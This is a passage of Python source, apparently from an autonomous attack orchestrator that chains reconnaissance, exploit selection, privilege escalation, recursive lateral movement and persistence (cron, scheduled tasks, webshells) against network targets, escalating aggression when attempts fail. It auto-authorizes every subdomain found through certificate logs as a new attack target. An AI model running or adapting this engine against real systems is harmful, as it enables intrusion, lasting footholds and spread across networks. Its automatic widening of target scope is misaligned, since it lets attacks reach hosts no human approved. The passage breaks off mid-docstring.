        _report_autonomous_progress(phase=state.current_phase.value, target=state.target)
        state.add_timeline_event("phase_start", "Reconnaissance phase started")

        if state.recon_result and state.recon_result.open_ports:
            logger.info(
                f"[RECON] Resuming with prior recon ({len(state.recon_result.open_ports)} "
                f"ports) — skipping re-scan"
            )
            state.add_timeline_event(
                "recon_reused",
                f"Reused prior recon with {len(state.recon_result.open_ports)} open ports",
                {"ports": state.recon_result.open_ports, "resumed": True},
            )
            return

        recon_result = await self._recon.recon_host(state.target)
        state.recon_result = recon_result

        if recon_result.open_ports:
            state.add_timeline_event(
                "recon_complete",
                f"Found {len(recon_result.open_ports)} open ports",
                {"ports": recon_result.open_ports, "services": [s.service for s in recon_result.services]},
            )
            logger.info(f"[RECON] Found {len(recon_result.open_ports)} ports on {state.target}")
        else:
            state.add_timeline_event("recon_empty", "No open ports found")

        # Domain targeting: when the operator gave a domain, run subdomain
        # expansion after the primary recon to discover the full attack
        # surface. Each discovered (subdomain, ip) pair is auto-authorized
        # via add_discovered_target so the agent can attack them. This is
        # best-effort: a failure degrades to no expansion (the primary
        # target is still attacked). The actual subdomain discovery uses
        # the same crt.sh + DNS bruteforce as the enumerate_subdomains MCP
        # tool, but runs inline here (Path B has no MCP session).
        if state.original_target and state.original_target != state.target:
            try:
                from tools.mcp_shared import add_discovered_target
                from tools.validation_utils import is_fqdn, is_subdomain_of, resolve_target_to_ip
                if is_fqdn(state.original_target):
                    logger.info(
                        f"[RECON] Domain target {state.original_target} -- "
                        f"expanding attack surface via subdomain enumeration"
                    )
                    # Reuse the crt.sh passive source (no external dep).
                    import json as _json
                    import urllib.request as _urlreq
                    dom = state.original_target.strip().lower()
                    try:
                        req = _urlreq.Request(
                            f"https://crt.sh/?q=%25.{dom}&output=json",
                            headers={"User-Agent": "NetAttackAi-Orchestrator/1.0"},
                        )
                        with _urlreq.urlopen(req, timeout=20) as resp:  # noqa: S310
                            body = resp.read().decode(errors="replace")
                        subs: set[str] = set()
                        if body:
                            for row in _json.loads(body):
                                for nv in str(row.get("name_value", "")).splitlines():
                                    for s in nv.split(","):
                                        s = s.strip().lstrip("*.").strip().lower()
                                        if s and is_subdomain_of(s, dom) and s != dom:
                                            subs.add(s)
                        for sub in sorted(subs)[:200]:
                            ip = resolve_target_to_ip(sub)
                            if ip:
                                state.discovered_subdomains.append(
                                    {"subdomain": sub, "ip": ip}
                                )
                                add_discovered_target(sub, ip)
                    except Exception as exc:
                        logger.warning(
                            f"[RECON] Subdomain expansion failed for {dom}: {exc}"
                        )
                    if state.discovered_subdomains:
                        state.add_timeline_event(
                            "subdomain_expansion",
                            f"Discovered {len(state.discovered_subdomains)} subdomains",
                            {"subdomains": state.discovered_subdomains[:20]},
                        )
                        logger.info(
                            f"[RECON] Discovered {len(state.discovered_subdomains)} "
                            f"subdomains of {state.original_target}"
                        )
            except Exception as exc:  # pragma: no cover - defensive
                logger.warning(f"[RECON] Domain expansion hook failed: {exc}")

    async def _phase_exploitation(self, state: AttackState, *, skip_failed: bool = False) -> None:
        """Automatically select and execute attack modules based on recon.

        ``skip_failed`` (Phase 2.4 adaptive replan) drops modules that already
        failed this campaign from the ranked list, so an adaptive round attacks
        a different surface instead of re-attacking the same dead module.
        Default False preserves the single-pass behavior.
        """
        logger.info(f"[EXPLOIT] Starting exploitation against {state.target}")
        ui.phase_change("exploitation")
        state.current_phase = AttackPhase.EXPLOITATION
        _report_autonomous_progress(phase=state.current_phase.value, target=state.target)
        state.add_timeline_event("phase_start", "Exploitation phase started")

        if not state.recon_result:
            logger.warning("No recon result available for exploitation")
            return

        # Get applicable modules sorted by score
        # Evidence-aware ranking: carry version + CPE + the full per-service CVE
        # list (the audit flagged these were dropped -- the ranking's
        # service:version:os signature at registry.py:249-298 needs version to
        # query the ExperienceStore, and the dormant Bayesian boost never fired
        # because experience_store was never passed).
        ctx = self._module_context(state)

        scored_modules = find_modules(ctx, experience_store=self._experience_store)
        if skip_failed:
            # Adaptive replan: exclude modules that already failed this campaign
            # so the round tries a different attack surface. Preserves ranking.
            failed = set(state.failed_attempts.keys())
            scored_modules = [(s, m) for (s, m) in scored_modules if m.name not in failed]
            logger.info(
                f"[EXPLOIT] Adaptive replan: {len(scored_modules)} modules after "
                f"dropping {len(failed)} previously-failed"
            )
        logger.info(f"[EXPLOIT] {len(scored_modules)} applicable modules found")

        # Create attack tasks for top modules
        tasks: list[AttackTask] = []
        ranked_names: set[tuple[str, str]] = set()  # (module_name, port) for dedupe
        for score, module in scored_modules[:15]:  # Top 15 modules
            # Derive the effective port from the module's primary service if
            # available, so service-specific tasks (below) can dedupe against it.
            _port = ""
            for s in state.recon_result.services:
                if s.service.lower() in {t.lower() for t in module.target_services}:
                    _port = f"{s.port}/{s.protocol}"
                    break
            ranked_names.add((module.name, _port))
            task = AttackTask(
                task_id=self._new_task_id(),
                phase=AttackPhase.EXPLOITATION,
                module_name=module.name,
                target=state.target,
                parameters={"score": score, **module.to_json()},
                aggression=state.aggression,
                priority=score,
            )
            tasks.append(task)
            self._tasks[task.task_id] = task

        # Also add service-specific tasks, skipping any that duplicate a ranked
        # module (same name + port). The audit flagged the ranked and
        # service-specific lists were merged without dedupe, so the same module
        # could execute twice against the same port.
        service_tasks = self._create_service_specific_tasks(state)
        for st in service_tasks:
            _key = (st.module_name, str(st.parameters.get("port", "")))
            if _key in ranked_names:
                logger.info(f"[EXPLOIT] Dropping duplicate service task {st.module_name} on {_key[1]}")
                continue
            tasks.append(st)

        # Execute tasks with concurrency limit
        await self._execute_task_batch(tasks, state)

        # If no success and aggression can be escalated, retry with higher aggression
        if not state.access_achieved and state.aggression != self._max_aggression:
            state.escalate_aggression()
            logger.info(f"[EXPLOIT] Escalating aggression to {state.aggression.value}, retrying failed modules")
            await self._retry_failed_modules(state)

    async def _phase_privilege_escalation(self, state: AttackState) -> None:
        """Attempt privilege escalation after successful exploitation."""
        logger.info(f"[PRIVESC] Starting privilege escalation against {state.target}")
        ui.phase_change("privilege_escalation")
        state.current_phase = AttackPhase.PRIVILEGE_ESCALATION
        _report_autonomous_progress(phase=state.current_phase.value, target=state.target)
        state.add_timeline_event("phase_start", "Privilege escalation phase started")

        privesc_modules = []
        if state.recon_result and "linux" in state.recon_result.os_family.lower():
            privesc_modules = ["LinuxPrivescCheck", "SUIDEnumeration", "KernelExploitCheck"]
        elif state.recon_result and "windows" in state.recon_result.os_family.lower():
            privesc_modules = ["WindowsPrivescCheck", "TokenImpersonation", "ServiceMisconfiguration"]
        else:
            privesc_modules = ["LinuxPrivescCheck", "WindowsPrivescCheck", "ContainerBreakout"]

        # Phase 4: cloud/container privesc modules were previously unreachable
        # from Path B (they appeared in NO privesc list). Gate them on the
        # recon port set intersecting the cloud/container API surface
        # (Docker 2375/2376, kubelet 10250, kube-apiserver 6443, IMDS-adjacent
        # 80/443) OR an os_family hint of cloud/container. The modules
        # themselves stay target-locked (they run ON the owned target).
        if state.recon_result:
            open_ports = {s.port for s in state.recon_result.services}
            cloud_ports = {2375, 2376, 10250, 6443, 443, 80}
            os_hint = (state.recon_result.os_family or "").lower()
            if open_ports & cloud_ports or "cloud" in os_hint or "container" in os_hint:
                privesc_modules += [
                    "CloudPrivesc", "K8sPrivesc", "IMDSExploit",
                    "DockerSockEscape", "S3BucketTakeover",
                ]

        tasks: list[AttackTask] = []
        for mod_name in privesc_modules:
            task = AttackTask(
                task_id=self._new_task_id(),
                phase=AttackPhase.PRIVILEGE_ESCALATION,
                module_name=mod_name,
                target=state.target,
                aggression=state.aggression,
                priority=80,
            )
            tasks.append(task)
            self._tasks[task.task_id] = task

        await self._execute_task_batch(tasks, state)

        # Phase 3: advisory local_exploit_suggester follow-up. Only when the
        # config flag is on AND access was achieved (so a meterpreter session
        # plausibly exists). The module is info-only -- it suggests the MSF
        # recipe and does NOT fabricate a session id (Path B has none).
        if self._auto_local_exploit_suggester and state.access_achieved:
            les_task = AttackTask(
                task_id=self._new_task_id(),
                phase=AttackPhase.PRIVILEGE_ESCALATION,
                module_name="LocalExploitSuggester",
                target=state.target,
                aggression=state.aggression,
                priority=60,
            )
            self._tasks[les_task.task_id] = les_task
            await self._executor.execute(les_task, state)
            state.add_timeline_event(
                "local_exploit_suggester",
                "Advisory local_exploit_suggester follow-up dispatched (info-only)",
            )

    async def _phase_lateral_movement(self, state: AttackState, _depth: int = 0) -> None:
        """Attempt lateral movement to discovered pivot targets.

        ``_depth`` is the pivot-hop count of the calling target; further recursion
        is capped at ``self._max_pivot_depth`` (Tier 0 item 0.6a) and any pivot we
        have already attacked is skipped (visited guard) so a rediscovered host
        can't loop the campaign.
        """
        logger.info(f"[LATERAL] Starting lateral movement from {state.target} (pivot depth {_depth})")
        ui.phase_change("lateral_movement")
        state.current_phase = AttackPhase.LATERAL_MOVEMENT
        _report_autonomous_progress(phase=state.current_phase.value, target=state.target)
        state.add_timeline_event("phase_start", "Lateral movement phase started")

        # Gap 2: defense-in-depth. A local target has no internal network to
        # pivot to from itself; even if pivot_targets somehow got populated,
        # never recurse from a local host.
        if is_local_target(state.target):
            state.add_timeline_event(
                "lateral_skip_local",
                "Skipping lateral movement -- target is this host (no pivot from self)",
            )
            logger.info(f"[LATERAL] Skipping lateral movement for local target {state.target}")
            return

        for pivot in state.pivot_targets[:5]:  # Limit to 5 pivot targets per level
            if pivot in self._states:
                state.add_timeline_event("lateral_skip", f"Skipping already-attacked pivot {pivot}")
                continue
            task = AttackTask(
                task_id=self._new_task_id(),
                phase=AttackPhase.LATERAL_MOVEMENT,
                module_name="LateralMovement",
                target=pivot,
                parameters={"source": state.target},
                aggression=state.aggression,
                priority=70,
            )
            self._tasks[task.task_id] = task
            result = await self._executor.execute(task, state)
            if result.get("success"):
                state.add_timeline_event("lateral_success", f"Moved to {pivot}")
                # Recursively attack the new target, capped at max_pivot_depth so
                # a pivot chain can't run away (the old code recursed unbounded).
                if _depth + 1 < self._max_pivot_depth:
                    await self._attack_target(pivot, _depth=_depth + 1)
                else:
                    state.add_timeline_event(
                        "pivot_depth_cap",
                        f"Pivot-depth cap ({self._max_pivot_depth}) reached; not recursing into {pivot}",
                    )
                    logger.info(f"[LATERAL] Pivot-depth cap reached at {pivot} (depth {_depth + 1})")
            else:
                state.add_timeline_event("lateral_failed", f"Failed to move to {pivot}: {result.get('error')}")

    async def _phase_validation(self, state: AttackState) -> None:
        """Validate all findings and generate evidence."""
        logger.info(f"[VALIDATE] Starting validation for {state.target}")
        ui.phase_change("validation")
        state.current_phase = AttackPhase.VALIDATION
        _report_autonomous_progress(phase=state.current_phase.value, target=state.target)
        state.add_timeline_event("phase_start", "Validation phase started")

        # Validate each successful exploit
        for exploit in state.successful_exploits:
            task = AttackTask(
                task_id=self._new_task_id(),
                phase=AttackPhase.VALIDATION,
                module_name="ValidateFinding",
                target=state.target,
                parameters={"exploit": exploit},
                priority=90,
            )
            self._tasks[task.task_id] = task
            await self._executor.execute(task, state)

    # ── Phase 2.2: Persistence (opt-in) ──────────────────────────────────

    _PERSISTENCE_MARKER_RE = re.compile(r"PERSISTENCE_INSTALLED:\s*(\S+)", re.IGNORECASE)

    def _extract_persistence_marker(self, output_text: str) -> str | None:
        """Return the lowercased persistence method a dispatch output confirms.

        Persistence modules print ``PERSISTENCE_INSTALLED: <method>`` (cron /
        schtask / webshell) when they install a foothold. Unlike shell
        compromise, this is NOT a signal ``classify_exploit_result`` looks for
        (persistence runs after access is achieved), so the handler scans the
        raw dispatch output itself.
        """
        m = self._PERSISTENCE_MARKER_RE.search(str(output_text or ""))
        return m.group(1).lower() if m else None

    def _module_context(
        self, state: AttackState, task: AttackTask | None = None,
    ) -> ModuleContext:
        """Build the ModuleContext the attack modules expect from current state.

        Carries version + CPE + the full per-service CVE list (the audit flagged
        these were dropped, so the ranking's service:version:os signature at
        registry.py:249-298 always read an empty version and the Bayesian boost
        never fired). The CVE list now pulls from openssh_cves plus any CVE the
        recon pipeline attached to the service's scripts (broader than the
        OpenSSH-only gate).

        Capability-upgrade (§12): threads live attack state (access/priv/
        sessions/phase/evidence_refs) and, when a task is supplied, its
        parameters -- the audit flagged this builder omitted ``parameters``
        while the execute() builder omitted the live-state fields. The
        ``task`` kwarg is optional so existing call sites (which pass only
        ``state``) stay byte-identical (``parameters`` defaults to {}).
        """
        services_full = []
        cves: list[str] = []
        import re as _re
        for s in (state.recon_result.services if state.recon_result else []):
            services_full.append({
                "service": s.service,
                "port": f"{s.port}/{s.protocol}",
                "version": s.version,
                "cpe": list(s.cpe),
                "banner": s.banner,
            })
            # openssh_cves may be a list of CVE IDs OR a single string. Handle
            # both (the audit flagged a character-iteration bug where a string
            # value was iterated char-by-char into the CVE list).
            openssh = s.scripts.get("openssh_cves", [])
            if isinstance(openssh, str):
                cves.extend(_re.findall(r"CVE-\d{4}-\d{4,}", openssh, _re.IGNORECASE))
            else:
                for cve in openssh:
                    cves.append(str(cve))
            # Also carry CVEs the recon pipeline attached under other script keys.
            for key, val in s.scripts.items():
                if key == "openssh_cves":
                    continue
                if isinstance(val, str):
                    cves.extend(_re.findall(r"CVE-\d{4}-\d{4,}", val, _re.IGNORECASE))
        return ModuleContext(
            target_ip=state.target,
            target_os=state.recon_result.os_family if state.recon_result else "",
            services=services_full,
            cves=sorted(set(cves)),
            # Phase 2: thread recovered creds + config so post-foothold modules
            # (persistence callback host, lateral movement) can read them.
            credentials=list(state.credentials_found),
            config=self._mission,
            # Capability-upgrade (§12): live attack state + task parameters so
            # modules queried via find_modules (and persistence modules) see
            # the same prerequisite/evidence surface the execute() builder
            # threads. ``parameters`` is {} when no task is supplied (the
            # legacy call shape) -> byte-identical with the prior builder.
            parameters=dict(task.parameters) if task is not None else {},
            access_achieved=state.access_achieved,
            privilege_level=state.privilege_level,
            sessions=(
                [{"shell": state.shell_type}] if state.access_achieved and state.shell_type else []
            ),
            phase=state.current_phase.value,
            evidence_refs=list(state.loot)[-10:],
        )

    async def _phase_persistence(self, state: AttackState) -> None:
        """Establish persistence on a compromised host (Phase 2.2, opt-in).

        Runs only after ``access_achieved`` is True -- persisting on a host you
        do not yet control is meaningless. Selects OS-appropriate persistence
        modules (LinuxPersistence / WindowsPersistence) plus WebShellPersistence
        when a web service is exposed, dispatches each module's generated
        script through the wired ``tool_executor``, and records confirmed
        methods in ``state.persistence_established`` by scanning the dispatch
        output for the ``PERSISTENCE_INSTALLED:`` marker. Without a
        tool_executor the phase is skipped (best-effort, like the local-takeover
        reads). A failure in one module never aborts the phase.
        """
        if not state.access_achieved:
            return
        logger.info(f"[PERSIST] Starting persistence against {state.target}")
        ui.phase_change("persistence")
        state.current_phase = AttackPhase.PERSISTENCE
        _report_autonomous_progress(phase=state.current_phase.value, target=state.target)
        state.add_timeline_event("phase_start", "Persistence phase started")

        os_family = (state.recon_result.os_family if state.recon_result else "") or ""
        mod_names: list[str] = []
        if "windows" in os_family.lower():
            mod_names.append("WindowsPersistence")
        else:
            mod_names.append("LinuxPersistence")
        web_services = {"http", "https"}
        if state.recon_result and any(
            (s.service or "").lower() in web_services for s in state.recon_result.services
        ):
            mod_names.append("WebShellPersistence")

        if not self._tool_executor:
            state.add_timeline_event(
                "persistence_skipped",
                "No tool_executor wired -- persistence scripts not dispatched",
            )
            logger.info("[PERSIST] No tool_executor; persistence scripts not dispatched")
            return

        ctx = self._module_context(state)
        for mod_name in mod_names:
            module = get_module(mod_name)
            if module is None:
                state.add_timeline_event("persistence_skip", f"Module {mod_name} unavailable")
                continue
            try:
                mresult_dict = await asyncio.to_thread(module.run, ctx) or {}
            except Exception as exc:  # noqa: BLE001 -- one bad module shouldn't abort the phase
                state.add_timeline_event("persistence_err", f"{mod_name}.run: {exc}")
                continue
            script = mresult_dict.get("script") or mresult_dict.get("suggested_command") or ""
            if not script:
                state.add_timeline_event("persistence_skip", f"{mod_name}: no runnable artifact")
                continue
            task = AttackTask(
                task_id=self._new_task_id(),
                phase=AttackPhase.PERSISTENCE,
                module_name=mod_name,
                target=state.target,
                aggression=state.aggression,
                priority=60,
            )
            self._tasks[task.task_id] = task
            try:
                out = await asyncio.to_thread(
                    self._tool_executor,
                    script,
                    {"target": state.target, "module": mod_name},
                )
            except Exception as exc:  # noqa: BLE001 -- dispatch failure is not fatal
                task.status = TaskStatus.FAILED
                task.error = str(exc)
                state.add_timeline_event("persistence_err", f"{mod_name} dispatch: {exc}")
                continue
            marker = self._extract_persistence_marker(str(out or ""))
            if marker:
                state.persistence_established.append(marker)
                task.status = TaskStatus.COMPLETED
                task.result = {"status": "success", "persistence": marker}
                state.add_timeline_event(
                    "persistence_established",
                    f"{mod_name} installed persistence via {marker}",
                    {"module": mod_name, "method": marker},
                )
            else:
                task.status = TaskStatus.FAILED
                task.error = "no PERSISTENCE_INSTALLED marker in dispatch output"
                state.add_timeline_event(
                    "persistence_failed",
                    f"{mod_name} dispatch did not confirm persistence",
                    {"module": mod_name},
                )

    # ── Phase 2.4: Adaptive replan + vuln-chaining (opt-in) ──────────────

    async def _run_adaptive_rounds(self, state: AttackState, _depth: int) -> None:
        """Run the exploit/privesc/lateral sequence as a bounded multi-round loop.

        Each round re-runs exploitation with already-failed modules dropped
        (adaptive replan), then privesc + lateral if their gates fire, then
        schedules vuln-chain metadata from the round's successes. The loop
        stops when ``state.should_continue()`` is False (access at max
        privilege and no pivot targets remain), the round cap
        (``max_cycles``) is hit, OR a round produces no novel candidate tasks
        (audit: the loop used to spin empty rounds after all modules were
        dropped, because ``should_continue()`` stayed true on
        ``not access_achieved`` even with nothing left to try). Bounded by
        construction -- no unbounded recursion, no re-attacking the same dead
        module forever.
        """
        max_rounds = max(1, int(self._max_cycles))
        rounds = 0
        while rounds < max_rounds and self._running:
            rounds += 1
            state.add_timeline_event(
                "adaptive_round", f"Adaptive round {rounds}/{max_rounds}"
            )
            logger.info(f"[ADAPTIVE] {state.target} round {rounds}/{max_rounds}")

            # Pre-round replan: skip_failed drops modules that already failed
            # this campaign so the round attacks a different surface.
            _tasks_before = len(self._tasks)
            await self._phase_exploitation(state, skip_failed=True)
            _tasks_after = len(self._tasks)

            # No-novel-candidate stop: if the exploitation phase created no new
            # tasks (all applicable modules already failed), continuing would
            # spin an empty round -- the audit flagged this could burn the full
            # ``max_cycles`` budget doing nothing. Stop instead.
            if _tasks_after == _tasks_before and not state.access_achieved:
                logger.info(
                    f"[ADAPTIVE] {state.target} round {rounds}: no novel "
                    f"candidate modules remain and no access achieved; stopping."
                )
                state.add_timeline_event(
                    "adaptive_stop",
                    "No novel candidate modules remain; stopping adaptive rounds.",
                )
                break

            if state.access_achieved and state.privilege_level not in ("system", "root", "admin"):
                await self._phase_privilege_escalation(state)
            if state.pivot_targets:
                await self._phase_lateral_movement(state, _depth)

            self._schedule_vuln_chain(state)

            # Phase 5: hard-target cutoff. If this round still produced no
            # access, count it. After ``hard_target_max_rounds`` consecutive
            # rounds without a foothold, give up on the target rather than
            # burning the remaining ``max_cycles`` budget on a host that has
            # answered nothing so far. Distinct from the no-novel-candidate
            # stop above (that one fires when there is literally nothing left
            # to try; this one fires when there IS plenty to try but it all
            # keeps failing). 0 = off (current behavior).
            if not state.access_achieved:
                state.hard_target_rounds += 1
                if (
                    self._hard_target_max_rounds
                    and state.hard_target_rounds >= self._hard_target_max_rounds
                ):
                    logger.info(
                        f"[ADAPTIVE] {state.target} gave up after "
                        f"{state.hard_target_rounds} rounds with no access "
                        f"(hard_target_max_rounds={self._hard_target_max_rounds})"
                    )
                    state.add_timeline_event(
                        "hard_target_give_up",
                        f"Target {state.target} produced no access in "
                        f"{state.hard_target_rounds} adaptive rounds; giving up "
                        f"to preserve campaign budget for remaining targets.",
                        {"rounds": state.hard_target_rounds},
                    )
                    break

            if not state.should_continue():
                break

    def _schedule_vuln_chain(self, state: AttackState) -> None:
        """Record vulnerability-chain metadata from the current foothold.

        Chains the last successful exploit -> harvested credentials -> discovered
        pivot targets into ``state.attack_paths`` (the report consumes these as
        the chain graph) and emits a ``vuln_chain_scheduled`` timeline event so
        the chain is observable. The actual lateral dispatch into pivot targets
        is handled by ``_phase_lateral_movement`` on the next round; this
        scheduler formalizes the chain links.
        """
        if not state.successful_exploits:
            return
        tail = f"exploit:{state.successful_exploits[-1]}"
        chains: list[list[str]] = []
        for cred in state.credentials_found[-3:]:
            chains.append([tail, f"creds:{cred}"])
        for pivot in state.pivot_targets[:5]:
            chains.append([tail, f"pivot:{pivot}"])
        if chains:
            state.attack_paths.extend(chains)
            state.add_timeline_event(
                "vuln_chain_scheduled",
                f"Scheduled {len(chains)} vuln-chain step(s) from {tail}",
                {"chains": chains},
            )

    # ── Task execution ───────────────────────────────────────────────────

    async def _execute_task_batch(self, tasks: list[AttackTask], state: AttackState) -> None:
        """Execute a batch of tasks with concurrency control."""
        semaphore = asyncio.Semaphore(3)  # Max 3 concurrent attacks
        # Capability-upgrade (§9): per-batch guard so each failing task
        # schedules at most one prerequisite-recovery task. Cleared per batch.
        prereq_scheduled: set[str] = set()

        async def run_task(task: AttackTask) -> None:
            # Bug #6: the retry used to recurse (``await run_task(task)``) from
            # *inside* the ``async with semaphore`` block. The recursive call
            # had to re-acquire the semaphore while the outer frame still held
            # its slot, so with 3 concurrent failing retryable tasks every
            # slot was occupied by an outer frame waiting on an inner frame
            # that could never get a slot — a classic deadlock. The loop
            # below releases the semaphore (the ``async with`` exits) before
            # sleeping/retrying, so retries re-acquire a slot cleanly.
            while True:
                async with semaphore:
                    result = await self._executor.execute(task, state)

                # Handle retry logic — semaphore is released here, so other
                # tasks can run during the backoff sleep.
                if not result.get("success") and not result.get("blocked"):
                    # Capability-upgrade (§9): prerequisite-driven composition.
                    # If the failure classifies as PREREQUISITE_MISSING, look
                    # up a producer module for the missing artifact and run it
                    # inline before retrying the original. Bounded by the
                    # per-batch set + the campaign-level ``_prereq_recovery_cap``.
                    # Recovery tasks are themselves exempt from re-scheduling
                    # (created_from tag) so a missing chain cannot recurse.
                    if (
                        task.created_from != "recovery:prerequisite"
                        and task.task_id not in prereq_scheduled
                    ):
                        prereq_task = self._maybe_schedule_prereq(
                            task, state, result.get("error", ""),
                        )
                        if prereq_task is not None:
                            prereq_scheduled.add(task.task_id)
                            await run_task(prereq_task)
                    if RetryEngine.should_retry(
                        task.module_name,
                        result.get("error", ""),
                        task.retry_count,
                        task.max_retries,
                    ):
                        task.retry_count += 1
                        task.parameters.update(
                            RetryEngine.get_retry_parameters(task.module_name, task.retry_count)
                        )
                        task.status = TaskStatus.RETRYING
                        logger.info(f"Retrying {task.module_name} with modified parameters (attempt {task.retry_count})")
                        await asyncio.sleep(2 ** task.retry_count)  # Exponential backoff
                        continue
                return

        await asyncio.gather(*[run_task(t) for t in tasks], return_exceptions=True)

    # ── Prerequisite-driven composition (§9) ───────────────────────────────

    # Maps a PREREQUISITE_MISSING error text to the candidate artifact kinds a
    # producer module could supply. Ordered by specificity; the first kind
    # with a producer wins. Kinds mirror the ``produces`` metadata modules
    # actually declare (credentials/hash_artifact/foothold/shell/webshell/
    # high_priv/admin_priv).
    _PREREQ_KIND_PATTERNS: tuple[tuple[re.Pattern[str], tuple[str, ...]], ...] = (
        (re.compile(r"credential|creds|password|hash", re.IGNORECASE), ("credentials", "hash_artifact")),
        (re.compile(r"foothold|session|\bshell\b|webshell", re.IGNORECASE), ("foothold", "shell", "webshell")),
        (re.compile(r"admin|root|privilege|high_priv|admin_priv", re.IGNORECASE), ("high_priv", "admin_priv")),
    )

    @classmethod
    def _prereq_artifact_kinds(cls, error: str) -> list[str]:
        """Derive candidate artifact kinds from a PREREQUISITE_MISSING error."""
        kinds: list[str] = []
        for pat, ks in cls._PREREQ_KIND_PATTERNS:
            if pat.search(error or ""):
                kinds.extend(ks)
        return kinds

    def _maybe_schedule_prereq(
        self, task: AttackTask, state: AttackState, error: str,
    ) -> AttackTask | None:
        """Schedule a producer module for a missing prerequisite, if one exists.

        Returns the new AttackTask (also registered in ``self._tasks``) or
        None when the failure is not a missing-prerequisite signal, no
        producer module is found, or the campaign-level recovery cap is hit.
        Bounded: one prereq task per failing task (enforced by the caller's
        ``prereq_scheduled`` set) and ``self._prereq_recovery_cap`` total.
        """
        try:
            from tools.failure_taxonomy import FailureClass, classify_failure
            fc = classify_failure(error)
        except Exception:  # noqa: BLE001 -- taxonomy import must never break the batch
            return None
        if fc != FailureClass.PREREQUISITE_MISSING:
            return None
        kinds = self._prereq_artifact_kinds(error)
        if not kinds:
            return None
        if self._prereq_tasks_added >= self._prereq_recovery_cap:
            return None
        for kind in kinds:
            for mod in find_producers(kind):
                if mod.name == task.module_name:
                    continue  # don't recurse into the failing module
                prereq_task = AttackTask(
                    task_id=self._new_task_id(),
                    phase=task.phase,
                    module_name=mod.name,
                    target=state.target,
                    aggression=task.aggression,
                    priority=min(100, task.priority + 10),
                    created_from="recovery:prerequisite",
                )
                self._tasks[prereq_task.task_id] = prereq_task
                self._prereq_tasks_added += 1
                logger.info(
                    f"[RECOVERY] Scheduled prerequisite producer {mod.name} "
                    f"(produces {kind}) for failed {task.module_name} ({error!r})"
                )
                return prereq_task
        return None

    async def _retry_failed_modules(self, state: AttackState) -> None:
        """Retry failed modules with escalated aggression."""
        all_failed = set(state.failed_attempts.keys()) - set(state.successful_exploits)
        # ponytail: drop modules over the campaign-level failure cap so a
        # structurally-failing exploit (e.g. Log4jRCE vs a non-vulnerable
        # target) doesn't get re-queued forever on every aggression step.
        failed_modules = {
            m for m in all_failed
            if len(state.failed_attempts.get(m, [])) < self._max_module_failures
        }
        dropped = all_failed - failed_modules
        if dropped:
            logger.info(
                f"Not retrying {len(dropped)} module(s) at failure cap "
                f"({self._max_module_failures}): {sorted(dropped)}"
            )

        tasks: list[AttackTask] = []
        for mod_name in failed_modules:
            task = AttackTask(
                task_id=self._new_task_id(),
                phase=AttackPhase.EXPLOITATION,
                module_name=mod_name,
                target=state.target,
                aggression=state.aggression,
                priority=60,
                max_retries=2,
            )
            tasks.append(task)
            self._tasks[task.task_id] = task

        if tasks:
            logger.info(f"Retrying {len(tasks)} failed modules with {state.aggression.value} aggression")
            await self._execute_task_batch(tasks, state)

    # ── Service-specific task creation ─────────────────────────────────

    def _create_service_specific_tasks(self, state: AttackState) -> list[AttackTask]:
        """Create additional tasks based on discovered services."""
        tasks: list[AttackTask] = []
        if not state.recon_result:
            return tasks

        for svc in state.recon_result.services:
            service = svc.service.lower()
            port = svc.port

            # SSH tasks
            if service == "ssh":
                tasks.append(AttackTask(
                    task_id=self._new_task_id(),
                    phase=AttackPhase.EXPLOITATION,
                    module_name="SSHBruteForce",
                    target=state.target,
                    parameters={"port": port, "version": svc.version},
                    priority=75,
                ))
                if "CVE-2024-6387" in str(svc.scripts.get("openssh_cves", "")):
                    tasks.append(AttackTask(
                        task_id=self._new_task_id(),
                        phase=AttackPhase.EXPLOITATION,
                        module_name="RegreSSHion",
                        target=state.target,
                        parameters={"port": port},
                        priority=95,
                    ))

            # SMB tasks
            elif service in ("microsoft-ds", "smb", "netbios-ssn"):
                tasks.append(AttackTask(
                    task_id=self._new_task_id(),
                    phase=AttackPhase.EXPLOITATION,
                    module_name="SMBRelay",
                    target=state.target,
                    parameters={"port": port},
                    priority=70,
                ))
                tasks.append(AttackTask(
                    task_id=self._new_task_id(),
                    phase=AttackPhase.EXPLOITATION,
                    module_name="SMBNullSession",
                    target=state.target,
                    parameters={"port": port},
                    priority=65,
                ))

            # HTTP/HTTPS tasks
            elif service in ("http", "https", "http-proxy"):
                tasks.append(AttackTask(
                    task_id=self._new_task_id(),
                    phase=AttackPhase.EXPLOITATION,
                    module_name="WebShellUpload",
                    target=state.target,
                    parameters={"port": port, "scheme": service},
                    priority=70,
                ))
                tasks.append(AttackTask(
                    task_id=self._new_task_id(),
                    phase=AttackPhase.EXPLOITATION,
                    module_name="SQLInjection",
                    target=state.target,
                    parameters={"port": port, "scheme": service},
                    priority=65,
                ))

            # FTP tasks
            elif service == "ftp":
                tasks.append(AttackTask(
                    task_id=self._new_task_id(),
                    phase=AttackPhase.EXPLOITATION,
                    module_name="FTPAnonymous",
                    target=state.target,
                    parameters={"port": port},
                    priority=60,
                ))

            # Redis tasks
            elif service == "redis":
                tasks.append(AttackTask(
                    task_id=self._new_task_id(),
                    phase=AttackPhase.EXPLOITATION,
                    module_name="RedisExploit",
                    target=state.target,
                    parameters={"port": port},
                    priority=75,
                ))

            # Docker/K8s tasks
            elif port in (2375, 2376, 6443, 10250):
                tasks.append(AttackTask(
                    task_id=self._new_task_id(),
                    phase=AttackPhase.EXPLOITATION,
                    module_name="ContainerBreakout",
                    target=state.target,
                    parameters={"port": port},
                    priority=80,
                ))

            # RDP tasks
            elif service in ("ms-wbt-server", "rdp"):
                tasks.append(AttackTask(
                    task_id=self._new_task_id(),
                    phase=AttackPhase.EXPLOITATION,
                    module_name="RDPExploit",
                    target=state.target,
                    parameters={"port": port},
                    priority=70,
                ))

        for task in tasks:
            self._tasks[task.task_id] = task

        return tasks

    # ── Persistence ──────────────────────────────────────────────────────

    def save_state(self, path: Path | None = None) -> Path:
        """Save all attack states to disk."""
        save_path = path or self._workspace / "attack_states.json"
        data = {
            "saved_at": datetime.now(timezone.utc).isoformat(),
            "states": {t: s.to_dict() for t, s in self._states.items()},
            "tasks": {tid: t.to_dict() for tid, t in self._tasks.items()},
            # ponytail: without this, load_state leaves _task_counter at 0 and
            # _new_task_id restarts at ATK-00001, colliding with restored task
            # IDs and overwriting them (silent data loss on every resume).
            "task_counter": self._task_counter,
        }
        save_path.write_text(json.dumps(data, indent=2, default=str))
        logger.info(f"Attack state saved to {save_path}")
        return save_path

    def load_state(self, path: Path) -> bool:
        """Load attack states from disk (Tier 1.3 — made real).

        Reconstructs ``self._states`` (per-target AttackState, including the
